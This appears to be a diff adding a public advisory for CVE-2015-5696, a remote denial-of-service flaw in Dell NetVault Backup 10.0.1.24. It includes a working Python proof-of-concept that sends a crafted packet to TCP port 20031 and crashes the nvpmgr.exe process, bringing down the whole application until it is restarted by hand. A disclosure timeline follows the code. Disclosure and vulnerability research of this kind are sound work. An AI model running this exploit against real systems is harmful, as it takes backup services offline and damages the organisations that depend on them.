@@ -1,0 +1,59 @@
+"""
+Product: Dell Netvault Backup
+Link: http://software.dell.com/products/netvault-backup/
+Vendor: Dell
+Vulnerable Version(s): 10.0.1.24 and probably prior
+Tested Version: Version 10.0.1.24
+Advisory Publication: July 30, 2015 
+Vendor Notification: January 9, 2015
+Public Disclosure: July 30, 2015
+Vulnerability Type: Remote Denial of service
+CVE Reference: CVE-2015-5696
+Risk Level: Medium
+Discovered and Provided: Josep Pi Rodriguez https://es.linkedin.com/pub/josep-pi-rodriguez/60/229/b24
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+Doing reverse engineering of the protocol was found several ways to cause a crash in the nvpmgr.exe process.The entire application (all processes) will die and it won't be able to restart again by itself unless someone do it manually.
+
+Proof of concept script:
+"""
+
+#!/usr/bin/python
+import socket as so
+from struct import *
+
+server = "192.168.140.130"
+port = 20031
+d = "\x18\x00\x00\x00"  
+d += "\x01" 
+
+#d += "\xCB\x22\x77\xC9" # Another crash example
+d += "\x18\xE8\xBE\xC8" # Will cause the crash
+d += "\x0B\x00\x00\x00" + "AAAA" + "B" * 6  
+d += "\x00" # null byte
+
+##
+# send it
+
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+s.connect((server, port))
+s.send(d)
+s.close()
+
+"""
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Disclosure timeline:
+2015-01-09 Vendor notified via email
+2015-05-26 Vendor notifies that the issue is fixed in version 10.0.5.x
+2015-07-30 Public disclosure.
+
+The fix done by Dell was not checked by the researcher.
+
+-----------------------------------------------------------------------------------------------
+"""
